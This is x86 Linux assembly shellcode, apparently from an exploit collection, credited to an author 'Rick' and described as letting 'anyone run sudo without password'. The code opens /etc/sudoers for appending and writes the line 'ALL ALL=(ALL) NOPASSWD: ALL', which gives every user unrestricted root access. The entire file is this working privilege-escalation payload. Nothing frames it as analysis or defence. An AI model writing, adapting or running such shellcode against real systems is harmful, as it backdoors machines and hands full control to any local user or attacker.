; Author: Rick
; Email: rick2600@hotmail.com
; OS: Linux/x86
; Description: Anyone can run sudo without password

section .text
global _start

_start:

	;open("/etc/sudoers", O_WRONLY | O_APPEND);
	xor eax, eax    ; clean eax
	push eax        ; push eax
	push 0x7372656f ; 'sreo'
	push 0x6475732f ; 'dus/'
	push 0x6374652f ; 'cte/'
	mov ebx, esp    ; save pointer to ebx
	mov cx, 0x401   ; O_WRONLY | O_APPEN = 0x401
	mov al, 0x05    ; syscall 0x05 -> open()
	int 0x80        ; syscall open()

	mov ebx, eax    ; save fd to ebx

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	xor eax, eax    ; clean eax
	push eax        ; push eax
	push 0x0a4c4c41 ; '\nLLA'
	push 0x203a4457 ; ' :DW'
	push 0x53534150 ; 'SSAP'
	push 0x4f4e2029 ; 'ON )'
	push 0x4c4c4128 ; 'LLA('
	push 0x3d4c4c41 ; '=LLA'
	push 0x204c4c41 ; ' LLA'
	mov ecx, esp    ; save pointer to ecx
	mov dl, 0x1c    ; edx = 0x1c = 28 byte
	mov al, 0x04    ; syscall 0x04 -> write()
	int 0x80        ; syscall write()

	;close(file)
	mov al, 0x06    ; syscall 0x06 -> close()
	int 0x80        ; syscall close()

	;exit(0);
	xor ebx, ebx    ; clean ebx
	mov al, 0x01    ; syscall 0x1 -> exit()
	int 0x80        ; syscall exit()
